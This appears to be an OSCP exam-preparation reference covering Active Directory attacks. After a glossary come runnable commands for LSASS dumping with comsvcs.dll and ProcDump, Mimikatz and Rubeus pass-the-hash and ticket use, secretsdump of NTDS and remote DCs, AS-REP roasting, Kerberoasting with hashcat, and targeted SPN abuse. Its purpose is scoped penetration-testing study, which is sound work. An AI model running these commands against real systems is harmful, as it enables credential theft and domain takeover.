terms.label: SID
terms.definition: A security identifier names a principal. Resolve the account/domain and controlled group membership before treating an ACE as usable.

terms.label: memberOf
terms.definition: A direct membership backlink. It is not a complete list of nested memberships, primary-group relationships or effective rights.

terms.label: SPN
terms.definition: A service principal name associates a Kerberos service instance with an account. It is not a password-strength or reachability result.

terms.label: ACE
terms.definition: One access-control entry: trustee, operation, allow/deny and applicability. It is not the whole effective-access decision.

terms.label: DACL
terms.definition: The discretionary ACL describing access rules on an object. Evaluate the relevant complete rules and trustee context.

terms.label: ObjectAceType
terms.definition: A GUID identifying the attribute, property set or extended operation scoped by an object-specific ACE; interpret it with the right and object type.

terms.label: ActiveDirectoryRights
terms.definition: Operations represented by an AD ACE. A displayed right still needs trustee, deny, inheritance and object-specific applicability checks.

terms.label: SecurityIdentifier
terms.definition: The trustee SID field commonly emitted by PowerView Get-DomainObjectAcl. Resolve it separately; -ResolveGUIDs resolves operation GUIDs, not every principal name.

terms.label: IdentityReference
terms.definition: A principal-reference property used by some ACL APIs. Do not assume every PowerView object emits it; inspect the returned properties when a projection is blank.

terms.label: integrity level
terms.definition: A Windows mandatory-integrity label on the current token. Medium integrity and membership in Administrators do not establish an elevated usable token.

terms.label: token
terms.definition: A process/logon security context. Group attributes, privileges, integrity and network credentials affect different operations.

terms.label: LUID
terms.definition: A locally unique identifier used for a logon session. It is not the domain SID, and another session cache generally needs additional access.

terms.label: TGT
terms.definition: A ticket-granting ticket for a realm, used to request service tickets when its identity, lifetime and KDC conditions are valid.

terms.label: service ticket
terms.definition: A Kerberos ticket targeting a service/SPN. Authentication with it still leaves service authorization to be checked.

terms.label: KDC
terms.definition: The Kerberos key distribution service. Route, realm, DNS/SPN and time failures differ from rejected credentials.

terms.label: effective permission
terms.definition: The operation actually allowed after the current trustee memberships, allow/deny rules, scope, inheritance and object-specific restrictions are considered.

terms.label: authentication
terms.definition: Establishing an identity through a protocol. Success does not automatically permit a share read, remote logon or execution.

terms.label: authorization
terms.definition: The permission decision for the requested object or operation after identity context is established.

terms.label: inconclusive
terms.definition: The available observation cannot establish or rule out the hypothesis. Name the missing evidence and the check that could resolve it.

terms.label: HasSession
terms.definition: A time-sensitive collected computer/user session relationship. Check source, freshness and host control; it does not guarantee readable or reusable credentials.

terms.label: AdminTo
terms.definition: A candidate administrative relationship to a computer. Validate current rights, route, compatible service and token/policy constraints.

terms.label: AddMember
terms.definition: A candidate right to change group membership. Verify the controlled trustee and effective member-write permission, then separately check what membership enables.

terms.label: DCOnly
terms.definition: A SharpHound collection choice focused on DC/directory data. It does not establish live workstation-session coverage.

pages.title: OSCP Exploitation Reference
pages.markdown:
# OSCP Exploitation Reference [Open the default OSCP notes](https://armaanleg3nd.github.io/oscp/) — concise service and technique pages for everyday lookup. This repository is the extended library for additional procedures, variants and explanations. [Complete operational task index](reference/INDEX.md) — every procedure and task, searchable by service or technique. A task-oriented extended study knowledge base and exam playbook. Use the [Attack Strategy Map](notes/Attack_Strategy_Map.md) when you need to compare methods by prerequisites or study a technique in depth. Practical mastery remains tracked separately from publication. ## Learning resources Start with the [default notes](https://armaanleg3nd.github.io/oscp/). Open the [extended library](https://armaanleg3nd.github.io/oscp/library/) for the larger cheatsheets, complete procedures, mechanics and worked examples. The attack-stage directories below keep one owning procedure per task. - [AD cheatsheet](cheatsheets/active-directory.md): the main AD command collection and evidence-driven next checks; [annotated investigations](notes/ad-investigation/README.md) provide detailed output interpretation and expected behavior. - [AD surface helpers](scripts/ad-map/README.md): automatic native LDAP and current-host collectors with bounded findings summaries, private evidence and linked manual next checks; optional `-Preview`. - [Enumeration toolkit](notes/Automation_Toolkit.md): established multi-check collectors by stage, recommended foundations and defaults/optional behavior to review. - [Toolkit launchers](scripts/enum-toolkit/README.md): runnable Kali/Linux and Windows entry points using existing collectors, a pinned AutoRecon plugin profile and private run records. - [Attack-surface maps and notes](notes/Attack_Surface_Maps.md): technique-name maps link to detailed notes and exact quick-command sections. Complete track canvases are available alongside them. [Map setup](mindmaps/README.md) · [Complete atlas](OSCP-Attack-Surface-Atlas.zip). - [Interactive strategy workspace](https://armaanleg3nd.github.io/tools/oscp/): expandable workflows, recognition checks, commands and evidence-driven next decisions; [attack-path visualizer](https://armaanleg3nd.github.io/tools/attack-path/) for explicitly recorded investigation steps. - [Attack Strategy Map](notes/Attack_Strategy_Map.md): the complete documented method inventory, prerequisite-based selection and links between capability transitions. - [Discovery-to-recognition workflows](notes/Attack_Strategy_Map.md#discover-the-clue-before-choosing-a-method): where to investigate before choosing an attack. - [Recognition practice](notes/Recognition_Practice.md): unanswered paper cases for testing clue discovery and prerequisite reasoning. - [Self-contained method guides](notes/Attack_Strategy_Map.md#all-objectives-and-methods): explanations, prerequisite checks, commands/variants, worked examples, verification and failure-driven alternatives. - [Master Notes](notes/Master_Notes.md): attack reasoning, necessary mechanics, recognition clues and failure interpretation. - [Speedrun breakdown](notes/Speedrun_Breakdown.md): attack tasks, practical outcomes and the tooling map for accelerated study. - [getSH coverage map](notes/GetSH_Coverage.md): source snapshot, route/topic accounting, corrections and remaining speedrun gaps. - [Cheatsheet index](cheatsheets/README.md): compact, executable commands and decision cues for immediate lookup. - Use the stage and quick-task indexes below for complete operational procedures. > **Operational flow:** discovery and scanning → service enumeration → initial access → shells/transfers/credentials → local privilege escalation → AD/lateral movement → pivoting/tunneling → evidence/reporting. > **Study flow:** use the [grouped study sequence](notes/Speedrun_Breakdown.md#grouped-study-sequence). Numbered blocks remain stable lookup units; related blocks are learned as complete attack paths. > **Current exam boundary:** command impact is not the restriction test. Manual credential access, shells, privilege escalation and lateral-movement commands can be legitimate on assigned exam systems when their prerequisites and scope are satisfied. The current official guide instead prohibits spoofing, commercial tools/services, automatic exploitation tools, mass vulnerability scanners, AI chatbots/LLMs and features that perform equivalent restricted actions; Metasploit/Meterpreter has a one-selected-target limit and Metasploit pivoting is prohibited. Nmap/NSE, Nikto, Burp Free and DirBuster are explicitly listed as permitted examples. Recheck the [current OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) before the exam—this reference may be used offline, but AI must not be used during the exam or reporting phase. ## Stage index | Stage | Purpose | Open | | ---: | --- | --- | | 01 | Establish reachability, port coverage, application clues and the next enumeration queue | [Discovery and scanning](reference/01-discovery-scanning/README.md) | | 02 | Extract names, files, permissions, credentials, configuration and usable access from services | [Service enumeration](reference/02-service-enumeration/README.md) | | 03 | Use verified access paths to establish a remote session | [Initial access](reference/03-initial-access/README.md) | | 04 | Make execution reliable, move files and classify/recover/test credential material | [Shells, transfers and credentials](reference/04-shells-transfers-credentials/README.md) | | 05 | Trace Linux/Windows object control into higher-privileged execution | [Local privilege escalation](reference/05-local-privilege-escalation/README.md) | | 06 | Map domain relationships, gain a better identity and move through compatible services | [AD and lateral movement](reference/06-ad-lateral-movement/README.md) | | 07 | Reach internal services through explicit forwards, SOCKS or routed pivots | [Pivoting and tunneling](reference/07-pivoting-tunneling/README.md) | | 08 | Preserve reproducible transitions and report-ready evidence | [Evidence and reporting](reference/08-evidence-reporting/README.md) | [Tools and scripts](cheatsheets/tools-and-scripts.md) — lookup by tool name with task-specific commands and selection cues. ## Quick task index | Question | Open | | --- | --- | | Is my path correct, and which assigned hosts respond? ## How to use the reference 1. For study, choose the objective in the strategy map and compare its method prerequisites. 2. Read the selected method's checks, explanation, example, variants and next transitions. 3. For scoped practice, open its linked operational procedure and establish the required access/configuration. 4. Replace every placeholder and use the baseline or variant matching the observed context. 5. Interpret decisive output and failure cues before claiming the intended effect. 6. After a state change, follow the linked next methods and re-enumerate the new capability. Target IPs, credentials, flags, transcripts, licensed course text and machine solutions stay in private lab records.

Detailed annotated output remains linked beside the relevant checks. | Current access or observation | Check here | What the result must establish | | --- | --- | --- | | Starting with a domain identity | [Domain, DC, DNS and time](#domaindc-truth) | Process identity and network authentication context are recorded separately; naming/time/route dependencies work | | Need users, groups or computer names | [Windows baseline](#native--rsat--adsi), [Kali LDAP](#authenticated-ldap) or [quick helper calls](#1010-quick-use) | Useful identities and memberships, with collection gaps retained | | Readable share or deployment file | [Shares and policy files](#shares--sysvol--netlogon) | Exact file access and a selected configuration or credential lead | | SPN, object right, host permission or session | [Validate the relationship](#spns-acls-host-rights-and-sessions) | Effective right and missing prerequisite, rather than an assumed exploit | | A BloodHound path | [Collection and edge validation](#bloodhound-collection-and-decision) | Each relevant edge is current and usable in this identity context | | Account without preauthentication or a service identity | [AS-REP](#as-rep-roast) or [selected service tickets](#kerberoast) | Matching account conditions and useful recovery material | | Password, hash, ticket or secret | [Credential source](#credential-access), [tickets](#tickets) and [identity transitions](#acl-backed-identity-transitions) | Artifact type, principal and scope before choosing a supported use | | Credential plus a reachable host | [Lateral movement chooser](#lateral-movement-chooser) | Authentication, protocol authorization, execution and output are checked separately | | New identity, privilege, host or route | [Re-enumerate](#re-enumerate) | The new state and newly accessible resources are verified | ## 10.12.0 Quick use Windows directory queries use the current network identity. Run only the selected check; a result is a lead until its next prerequisite is verified.
Define LDAPSearch once in this PowerShell session Requires Windows PowerShell/.NET directory access, domain DNS and an authenticated directory context. No RSAT or PDC-specific connection is required. Paste the complete definition once; subsequent calls reuse it. ```powershell function LDAPSearch { [CmdletBinding()] param( [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$LDAPQuery, [string]$Server, [string]$SearchBase, [string[]]$Properties = @('samaccountname','distinguishedname','memberof','serviceprincipalname','description') ) $root = $entry = $searcher = $results = $null try { $prefix = if ($Server) { "LDAP://$Server/" } else { 'LDAP://' } if (-not $SearchBase) { $root = New-Object System.DirectoryServices.DirectoryEntry($prefix + 'RootDSE') $SearchBase = [string]$root.Properties['defaultNamingContext'][0] if (-not $SearchBase) { throw 'No default naming context; specify Server and SearchBase.' } } $entry = New-Object System.DirectoryServices.DirectoryEntry($prefix + $SearchBase) $searcher = New-Object System.DirectoryServices.DirectorySearcher($entry) $searcher.Filter = $LDAPQuery $searcher.PageSize = 1000 $searcher.PropertiesToLoad.AddRange($Properties) $results = $searcher.FindAll() foreach ($result in $results) { $values = @{} foreach ($name in $result.Properties.PropertyNames) { $values[$name] = @($result.Properties[$name]) } [pscustomobject]@{ Path = $result.Path; Properties = $values } } } finally { foreach ($resource in @($results,$searcher,$entry,$root)) { if ($null -ne $resource) { $resource.Dispose() } } } } ``` Results expose `.Path` and `.Properties`; property values remain arrays. Paging handles result pages, not ranged retrieval of very large group membership attributes. `memberOf` is direct membership and omits primary-group membership; it is not effective authorization. Function missing: define it in this session. Discovery/bind failure: fix identity, DNS, server and route. Empty query: verify base/filter against a known object before concluding absence. Do not suppress exceptions as empty results. `-Server DC_HOST -SearchBase 'DC=example,DC=test'` selects a directory explicitly; it does not supply different credentials.

A CIFS TGS does not authorize HTTP/WinRM or arbitrary HOST services. ### WinRM and RDP ```bash evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' evil-winrm -i TARGET -u USER -H NT_HASH evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution ``` ```cmd winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST ``` > FreeRDP 3 commonly exposes `xfreerdp3`; older packages use `xfreerdp`. `/pth` is Restricted Admin mode and requires administrator access, not merely ordinary RDP logon permission. ### Key and ticket transitions ```text sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe ``` ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt Rubeus.exe ptt /ticket:ticket.kirbi klist ``` > Overpass-the-Hash uses a long-term key to obtain a TGT; Pass-the-Ticket imports an existing ticket. In a Mimikatz PtH process, local `whoami` can remain the original process token while outbound authentication uses the supplied identity. | Failure | Check | | --- | --- | | Timeout/refused | Actual source route, listener, firewall and dynamic RPC | | Kerberos error | DNS, hostname/SPN, time, KDC route, ticket validity | | Auth works, execution fails | ADMIN$/SCM/WMI/task/endpoint rights, token filtering and method prerequisites | | Process created, no output | SMB/output channel, session 0, or verify a bounded side effect | | WinRM works, second hop fails | Credential delegation/double-hop context | | RDP password works, `/pth` fails | Restricted Admin configuration and administrator status | | BloodHound edge unusable | Effective principal, inheritance, host reachability, required service | | Share list works, file denied | Object-level ACL and guest/null mapping | After access, verify `hostname`, `whoami /all`, interfaces/routes and `klist`; then re-enumerate rights, sessions, credentials and newly reachable hosts. ## Re-enumerate New identity/host/route → repeat domain rights, shares, SPNs, sessions, host admin, local secrets and internal reachability. ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Commands and use-case variants > **Need:** A known domain identity or a directory endpoint that permits the selected anonymous query. Correct realm/domain and account qualification; reachable DC/services, usable DNS and acceptable clock skew ##### Domain-joined Windows source ```cmd whoami /all echo %USERDNSDOMAIN% echo %USERDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN w32tm /query /status ``` ```powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.DOMAIN Resolve-DnsName -Type SRV _kerberos._tcp.DOMAIN ``` > **Decisive output:** domain FQDN, DC FQDN/IP, current user SID/groups, DNS SRV answers and a plausible time source. `USERDOMAIN` can be a NetBIOS label; prefer the DNS domain for LDAP/Kerberos. ##### Kali/off-domain source ```bash dig +short SRV _ldap._tcp.dc._msdcs.DOMAIN @DC_IP dig +short SRV _kerberos._tcp.DOMAIN @DC_IP nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName ``` > RootDSE is a directory-server metadata object. Reading it can reveal naming contexts even when anonymous subtree searches are denied. Convert `corp.example` to `DC=corp,DC=example`; do not guess the base DN when RootDSE can supply it.
Remote Windows session and double-hop caveat ```cmd whoami /all klist dir \\DC_HOST\SYSVOL ``` A supplied credential may create the remote session without being delegated onward to the DC. If local identity commands work but access to a second host fails, distinguish a WinRM/PowerShell remoting credential-delegation problem from invalid credentials. An interactive RDP session, explicit credentials, `/netonly` network credentials or an off-domain LDAP client may create a different context; always record which identity is used locally and over the network.
```text IDENTITY MAP: USER/COMPUTER -> DIRECT + NESTED GROUPS -> DIRECTORY RIGHTS HOST MAP: COMPUTER -> OS/ROLE -> LOCAL/REMOTE-ACCESS RIGHTS -> SESSIONS ROUTE MAP: SOURCE -> DNS/KDC/DC/HOST -> REQUIRED PORT/SERVICE LEAD MAP: EVIDENCE -> HYPOTHESIS -> MINIMUM VALIDATION -> NEXT BLOCK ``` Authentication, authorization, reachability and session presence are independent. A valid LDAP bind does not prove share access; SMB administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials. ```text AS-REQ/AS-REP: user proves knowledge of long-term key -> receives TGT TGS-REQ/TGS-REP: TGT requests SERVICE/HOST -> receives service ticket AP-REQ: client presents service ticket -> service authenticates client AUTHORIZATION: target service still evaluates the represented identity/claims ``` Before changing credentials or tools: ```bash getent hosts DC_HOST nc -nvz DC_IP 88 date -u ``` ```cmd w32tm /query /status klist ``` Record domain FQDN/realm, DC FQDN/IP, source DNS, current time, KDC route and exact target SPN. IP connectivity does not replace hostname/SPN correctness. > **Verify:** Record represented identity, realm, selected DC, resolver, clock and real source route. > **If it fails:** Wrong domain, KDC timeout, clock skew and account denial are distinct failures. Do not repeatedly change passwords to fix a route problem.

| Candidate right | Possible transition to validate later | Missing proof now | | --- | --- | --- | | `GenericAll` | Broad object modification | Controlled trustee, target object class, applicable deny/inheritance and useful change | | `GenericWrite` / `WriteProperty` | Change one or more writable attributes | Exact attribute/object GUID and a transition that consumes it | | `WriteOwner` | Become owner | Ability to change the DACL afterward and use the resulting right | | `WriteDacl` | Add an ACE | Effective write-DACL right, planned narrow ACE and restoration | | `AllExtendedRights` / `ForceChangePassword` | Extended operation such as reset where applicable | Object class, exact extended right and downstream usefulness | | `Self` / validated write | Add self/member or another validated attribute where schema permits | Correct validated-write GUID and target type | | GPO/OU control | Affect linked computers/users | Writable GPO component, effective link/scope, refresh/trigger and target placement | An ACE is one rule. Therefore: - empty/denied is **inconclusive**, not proof of no users; - a session is a time-sensitive observation, not a durable ACL; - a session matters only if the current identity can reach/control that host and a later credential/ticket technique applies; - session presence does not prove credentials are resident, accessible or reusable. > **Verify:** Record the destination-specific successful action and freshness/limits of session evidence. > **If it fails:** Collection denial is not proof that no sessions exist; a valid credential is not proof of every host-access method.

##### Analyze in this order 1. Mark only identities/hosts actually controlled. A low-privilege session on a host does not make the host itself fully owned. 2. Inspect the controlled principal's direct and nested group memberships and outbound object-control edges. 3. Inspect reachable computers where it has local admin, RDP, WinRM/DCOM or other applicable rights. 4. Inspect high-value goals and shortest paths only as hypothesis generation. 5. Classify each selected edge: - directory/static-ish: group, ACL, GPO, OU, trust; - host-derived: local group or user right; - volatile: session; - route-dependent: the required host/service must be reachable now. 6. Reproduce the minimum important relationship manually before handing it to Block 11 or 12. ```text ID | CONTROLLED PRINCIPAL | RELATIONSHIP | TARGET | SOURCE EVIDENCE | EFFECTIVE? | ROUTE/SERVICE | VOLATILITY | EXPECTED TRANSITION | MINIMUM VALIDATION | STATUS | NEXT BLOCK ``` Rank candidates by: 1. confidence that the relationship is effective; 2. deterministic value of the resulting identity/access; 3. route and service availability; 4. stability versus volatile session timing; 5. reversibility and impact; 6. number of unsupported assumptions. Prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts. > **Verify:** Validate every useful edge against current directory/host evidence and identify the transition each one enables. > **If it fails:** Collector/version incompatibility and partial data are tool/visibility failures. They do not prove the environment lacks a path.
### Gain a more useful domain identity

Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material | Source | What it can contain | Typical prerequisite | Result is not automatically | | --- | --- | --- | --- | | Current ticket cache | TGTs and service tickets for the current logon session | Current user; other LUIDs normally require elevation | A password, NT hash or authorization to every service | | LSASS memory/dump | Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type | Administrator/SYSTEM, suitable debug/dump access, compatible architecture | Guaranteed cleartext or every user's reusable secret | | SAM + SYSTEM | Local account password hashes | Administrator/SYSTEM/backup-capable access to matched hives | Domain-account material | | SECURITY + SYSTEM | LSA secrets, service/machine secrets, cached domain verifiers | Administrator/SYSTEM/backup-capable access to matched hives | Directly passable cached-domain hashes | | Credential Manager/DPAPI | Targeted saved credentials and protected application data | Suitable user/machine context plus master-key material | Plaintext merely because a blob/file is readable | | NTDS + SYSTEM | Domain account hashes/keys from a DC database | DC-level file access and matched boot-key material | Ordinary member-server admin access | | DRS replication | Selected domain-account secrets | Effective replication rights at the domain root | Local admin, DC service access or Domain Users membership | ```cmd whoami /all tasklist /fi "imagename eq lsass.exe" reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags ``` ```powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus ``` Interpretation: - membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process; - `SeDebugPrivilege` must be present and usable for common live-process access; - a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter; An access-denied or empty result disproves only that method in the current context. ##### Direct Mimikatz access ```text mimikatz.exe privilege::debug sekurlsa::logonpasswords sekurlsa::tickets ``` Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with `Password : (null)` is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext. ##### Dump first, parse offline Built-in `comsvcs.dll` method from an elevated command prompt: ```cmd for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full ``` Sysinternals ProcDump alternative: ```cmd procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp ``` Parse with a compatible Mimikatz build: ```text mimikatz.exe sekurlsa::minidump C:\Path\To\lsass.dmp sekurlsa::logonpasswords sekurlsa::tickets ``` Common failures: - dump creation denied: token/protection/EDR or process-access prerequisite failed; - `ProcessorArchitecture` mismatch: use compatible x64/x86 tooling; - OS major-version mismatch: parse with a compatible build/environment; - dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents. LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective. ```powershell Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning ``` Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response. > **Verify:** Tie each artifact to an account, source/logon session and material type; independently validate any useful reuse. > **If it fails:** Protected process access denial, absent sessions and unsupported parsing are different outcomes. Prefer an accessible ticket or other matched source when available.

Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Return it to the credential-classification workflow; do not call it a domain credential. > **Verify:** Verify source machine, matched hive pair and account/RID mapping; validate destination rights separately. > **If it fails:** Mismatched/incomplete hives or denied backup operations require source repair. Matched NTDS/SYSTEM for offline parsing, or the specific remote protocol/host/replication rights required by the chosen method ##### Offline NTDS from an already controlled DC An offline parse needs a matched `NTDS.dit` and SYSTEM hive: ```bash impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL ``` Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. It does not prove the current identity can read `NTDS.dit`, that the copy is current, or that a matching SYSTEM hive has been acquired. `DiskShadow` is a Windows Server utility; absence on a workstation is a platform result, not proof that VSS does not exist. Creating, exposing or deleting a shadow changes host state and normally requires elevated backup/administrator context. Do not offer those actions until the selected procedure records the exact volume, matched NTDS/SYSTEM acquisition, destination, verification and cleanup. The state-machine gap is tracked as `RW08`; listing is safe discovery, not credential acquisition. ##### Remote collection ```bash impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST' ``` ```bash impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST' ``` This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. Test the bit, not equality to one whole decimal value, because other flags coexist. > **Validate next:** Check account state, KDC route, response/encryption type and feasible recovery; no-password discovery requires a real known username. Commands and use-case variants > **Need:** A known domain username for a password-free request, or an authenticated bind for directory-backed discovery. Account with preauthentication disabled, KDC reachability and a supported returned encryption type; no-password and authenticated-discovery contexts differ ##### Why AS-REP roasting works Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has `DONT_REQUIRE_PREAUTH`, an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates. ```text KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE -> AS-REP CIPHER -> OFFLINE GUESSING -> PASSWORD ONLY IF A CANDIDATE VERIFIES ``` ##### One known user, no password ```bash impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \ -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes ``` ##### Supplied user list, no password ```bash impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \ -dc-ip DC_IP -outputfile asrep.hashes ``` ##### Authenticated directory-backed discovery ```bash impacket-GetNPUsers 'DOMAIN/USER' -request \ -dc-ip DC_IP -outputfile asrep.hashes ``` Omitting the password from the target lets the tool prompt rather than storing it in shell history. ##### Windows/Rubeus alternative ```cmd Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat ``` ##### Interpret before cracking | Output | Meaning | Next action | | --- | --- | --- | | `$krb5asrep$23$` | RC4 AS-REP offline verifier | Hashcat mode 18200 | | AS-REP with another etype | Different cipher/format | Match the exact prefix to installed Hashcat/John support | | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User/realm not found | Recheck spelling, realm and DC | | Preauthentication required / no `UF_DONT_REQUIRE_PREAUTH` | Account is not roastable through this method | Disprove this path for that account | | Timeout/name error | KDC route/DNS problem | Fix route/FQDN/time before account conclusions | ```bash hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 18200 asrep.hashes --show ``` Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping. > **Verify:** Verify the account, realm, response format/encryption type and recovered credential if cracking succeeds. > **If it fails:** Preauthentication-required disproves this method for that account; unknown user, route and clock failures have different meanings.

[Request a selected service ticket for offline service-account recovery](../notes/methods/ad-identities.md#kerberos-roast).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy ##### Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. ```text VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES ``` Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. ##### Enumerate without requesting tickets ```bash impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST ``` ##### Request one selected user ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ```
Request all mapped candidates ```bash impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ``` Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.
##### Hash type and cracking | Prefix | Kerberos etype | Hashcat mode | | --- | ---: | ---: | | `$krb5tgs$23$` | RC4-HMAC | 13100 | | `$krb5tgs$17$` | AES128 | 19600 | | `$krb5tgs$18$` | AES256 | 19700 | ```bash hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show ``` Select the mode from the actual prefix and current `hashcat --example-hashes`; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. ##### Common failures - no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs; - `KDC_ERR_S_PRINCIPAL_UNKNOWN`: SPN is absent/malformed or queried in the wrong realm; - `KDC_ERR_ETYPE_NOSUPP`: requested cipher conflicts with account/domain policy; - output wraps or fails to load: save directly to an output file and verify prefix/line integrity; - crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.” > **Verify:** Record SPN/account/encryption type and verify any recovered password against the intended identity. > **If it fails:** No crack means only the tried candidates failed; a ticket request does not prove a weak password or host access.

[Create a temporary SPN through an effective object right](../notes/methods/ad-identities.md#ad-targeted-roast).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Effective SPN-property right, compatible account, unique temporary SPN, authenticated TGS request and exact cleanup If Block 10 proved effective write access to a user object's `servicePrincipalName`, an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state. Built-in SPN operations: ```cmd setspn -L TARGET_USER setspn -S temporary/TARGET_USER TARGET_USER ``` Request only that account: ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER' ``` Cleanup: ```cmd setspn -D temporary/TARGET_USER TARGET_USER setspn -L TARGET_USER ``` The controlled right must apply to the SPN attribute, `-S` must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity. If the effective right permits writing `servicePrincipalName` on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in [Kerberos and identity transitions](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md). ```powershell setspn -S TEMP/TARGET_USER TARGET_USER setspn -Q TEMP/TARGET_USER Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat setspn -D TEMP/TARGET_USER TARGET_USER ``` > **Verify:** Verify effective right, requested account and cleanup; confirm any recovered credential independently. > **If it fails:** GenericWrite must actually 